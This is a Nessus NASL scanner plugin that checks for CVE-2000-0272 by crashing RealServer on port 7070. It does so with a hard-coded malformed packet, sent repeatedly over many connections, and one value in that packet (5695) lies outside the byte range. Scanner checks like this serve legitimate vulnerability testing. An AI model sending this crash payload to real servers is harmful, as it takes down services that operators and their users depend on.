#
# (C) Tenable Network Security, Inc.
#

# Original exploit code : see http://www.ussrback.com
#


include("compat.inc");

if(description)
{
 script_id(10377);
 script_version ("$Revision: 1.16 $");
 script_cve_id("CVE-2000-0272");
 script_bugtraq_id(1128);
 script_xref(name:"OSVDB", value:"1290");
 
 script_name(english:"RealServer Port 7070 Malformed Input DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"It is possible to crash the remote service." );
 script_set_attribute(attribute:"description", value:
"It was possible to crash the remote RealServer by sending 
it a specially crafted packet." );
 script_set_attribute(attribute:"solution", value:
"http://service.real.com/help/faq/servg270.html" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 
 script_summary(english:"crashes RealServer");
 script_category(ACT_DENIAL);	# ACT_FLOOD?
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");
 script_require_ports(7070, "Services/realserver");
 script_dependencies("find_service1.nasl");
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

include("global_settings.inc");

function report(count, port)
{
 if(count)
   security_warning(port);
 exit(0);
} 

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/realserver");
if(!port)port = 7070;


if(get_port_state(port))
{

#
# Magic data made by USSR labs
#

die = raw_string(
80,78,65,0,10,0,20,0,2,0,1,0,4,0,255,255,255,255,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
255,0,24,0,16,169,127,52,242,108,214,69,252,104,17,223,247,246,241,174,137,
0,0,95,29,67,196,99,0,41,87,105,110,57,5695,52,46,49,48,95,54,46,48,46,54,
46,52,53,95,112,108,117,115,51,50,95,77,80,54,48,95,101,115,45,65,82,95,53,
56,54,108,0,0,82,255,255,48,48,48,48,48,48,48,48,48,48,48,48,48,48,48,48,
48,48,48,48,48,48,48,48,48,48,48,121,13,10,0);


count = 0;

#
# Tests show that this bug is more effective 
# when done multiple times
#
for(i=0;i<20;i=i+1)
{
 soc = open_sock_tcp(port);
 if(soc)count = count + 1;
 else report(count:count, port:port);
 for(j=0;j<20;j=j+1)
 send(socket:soc, data:die);
 close(soc);
}

 soc2 = open_sock_tcp(port);
 if(!soc2)
 {
 security_warning(port);
 }

}
